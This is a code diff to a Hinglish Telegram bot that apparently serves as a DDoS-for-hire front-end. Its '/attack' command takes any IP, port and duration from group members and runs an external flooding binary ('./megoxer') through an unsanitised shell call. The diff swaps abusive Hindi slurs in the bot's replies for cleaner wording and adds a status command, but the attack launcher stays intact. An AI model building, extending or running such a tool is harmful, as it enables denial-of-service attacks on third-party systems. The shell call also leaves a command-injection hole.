@@ -41,12 +41,12 @@ def update_attack_status(chat_id, message_id):
     while is_attack_running:
         remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
         if remaining_time <= 0:
-            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="✅ **Attack Khatam! Ab screenshot bhej, warna gaand maar dunga!** 📸")
+            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="✅ **Attack Khatam! Ab screenshot bhej!** 📸")
             is_attack_running = False
             return
         try:
             bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
-                                  text=f"⏳ **Attack chal raha hai... BSDK rukja! Bacha hua time: {int(remaining_time)}s**")
+                                  text=f"⏳ **Attack chal raha hai... Bacha hua time: {int(remaining_time)}s**")
         except:
             pass  
         time.sleep(5)
@@ -59,23 +59,23 @@ def handle_attack(message):
     command = message.text.split()
 
     if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, "🚫 **Oye chutiye! Ye bot sirf group me chalega!** ❌")
+        bot.reply_to(message, "🚫 **Ye bot sirf group me chalega!** ❌")
         return
 
     if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❗ **Pehle channel join kar, warna yahan se latth leke nikal!** {CHANNEL_USERNAME} 🔥")
+        bot.reply_to(message, f"❗ **Pehle channel join kar!** {CHANNEL_USERNAME}")
         return
 
     if pending_feedback.get(user_id, False):
-        bot.reply_to(message, "😡 **Pehle screenshot bhej saale, warna naya attack nahi lagega!** 🔥")
+        bot.reply_to(message, "😡 **Pehle screenshot bhej, warna naya attack nahi milega!**")
         return
 
     if is_attack_running:
-        bot.reply_to(message, "⚠️ **Ek attack already chal raha hai! Line me lag bklol.**")
+        bot.reply_to(message, "⚠️ **Ek attack already chal raha hai!**")
         return
 
     if len(command) != 4:
-        bot.reply_to(message, "⚠️ **O chaman! Sahi likh: /attack `<IP>` `<PORT>` `<TIME>`**")
+        bot.reply_to(message, "⚠️ **Usage: /attack `<IP>` `<PORT>` `<TIME>`**")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -84,11 +84,11 @@ def handle_attack(message):
         port = int(port)
         time_duration = int(time_duration)
     except ValueError:
-        bot.reply_to(message, "❌ **Port aur Time number hone chahiye, BC abcd mat likh!**")
+        bot.reply_to(message, "❌ **Port aur Time number hone chahiye!**")
         return
 
     if time_duration > 180:
-        bot.reply_to(message, "🚫 **Teri aukat nahi 180s se zyada ka!**")
+        bot.reply_to(message, "🚫 **180s se zyada allowed nahi hai!**")
         return
 
     # Confirm attack
@@ -96,8 +96,8 @@ def handle_attack(message):
 🎯 **Target:** `{target}`  
 🔢 **Port:** `{port}`  
 ⏳ **Duration:** `{time_duration}s`  
-🔄 **Status:** `Chal raha hai madarchod...`  
-📸 **Note:** Attack ke baad screenshot bhejna mat bhool, warna lath padegi!"""
+🔄 **Status:** `Chal raha hai...`  
+📸 **Note:** Attack ke baad screenshot bhejna zaroori hai!"""
 
     msg = bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown", reply_markup=create_check_button())
 
@@ -108,12 +108,12 @@ def handle_attack(message):
     update_thread = threading.Thread(target=update_attack_status, args=(message.chat.id, msg.message_id))
     update_thread.start()
 
-    bot.send_message(message.chat.id, f"🚀 **Attack Shuru BC!**\n🎯 `{target}:{port}`\n⏳ {time_duration}s", parse_mode="Markdown")
+    bot.send_message(message.chat.id, f"🚀 **Attack Shuru!**\n🎯 `{target}:{port}`\n⏳ {time_duration}s", parse_mode="Markdown")
 
     try:
         subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
     except subprocess.CalledProcessError:
-        bot.reply_to(message, "❌ **BC Attack fail ho gaya! Behen ke lode, sahi command de.**")
+        bot.reply_to(message, "❌ **Attack fail ho gaya!**")
         is_attack_running = False
         attack_end_time = None
         return
@@ -128,9 +128,18 @@ def handle_attack(message):
 def callback_check_status(call):
     if is_attack_running and attack_end_time:
         remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
-        bot.reply_to(call.message, f"⏳ **Chal raha hai BC! Bacha hua time: {int(remaining_time)}s**")
+        bot.reply_to(call.message, f"⏳ **Attack chal raha hai! Bacha hua time: {int(remaining_time)}s**")
     else:
-        bot.reply_to(call.message, "✅ **Kuch nahi chal raha ab! Shaant ho ja.**")
+        bot.reply_to(call.message, "✅ **Koi attack active nahi hai!**")
+
+# Handle /check command
+@bot.message_handler(commands=['check'])
+def handle_check(message):
+    if is_attack_running and attack_end_time:
+        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
+        bot.reply_to(message, f"⏳ **Attack chal raha hai... Bacha hua time: {int(remaining_time)}s**")
+    else:
+        bot.reply_to(message, "✅ **Koi attack active nahi hai!**")
 
 # Handle screenshot submission and forward to main channel
 @bot.message_handler(content_types=['photo'])
@@ -139,12 +148,12 @@ def handle_screenshot(message):
     
     if pending_feedback.get(user_id, False):
         bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)  
-        bot.send_message(CHANNEL_USERNAME, f"📸 **Ye saala `{user_id}` ka screenshot hai!**")
+        bot.send_message(CHANNEL_USERNAME, f"📸 **User `{user_id}` ka screenshot hai!**")
 
-        bot.reply_to(message, "✅ **Acha! Screenshot mil gaya BC! Ab tu naya attack laga sakta hai.** 🚀")
+        bot.reply_to(message, "✅ **Screenshot mil gaya! Ab tu naya attack laga sakta hai.** 🚀")
         del pending_feedback[user_id]  
     else:
-        bot.reply_to(message, "❌ **Abey yeh kya kar raha hai! Screenshot dene ki zaroorat nahi hai ab.**")
+        bot.reply_to(message, "❌ **Ab screenshot bhejne ki zaroorat nahi hai!**")
 
 # Bot start command
 @bot.message_handler(commands=['start'])
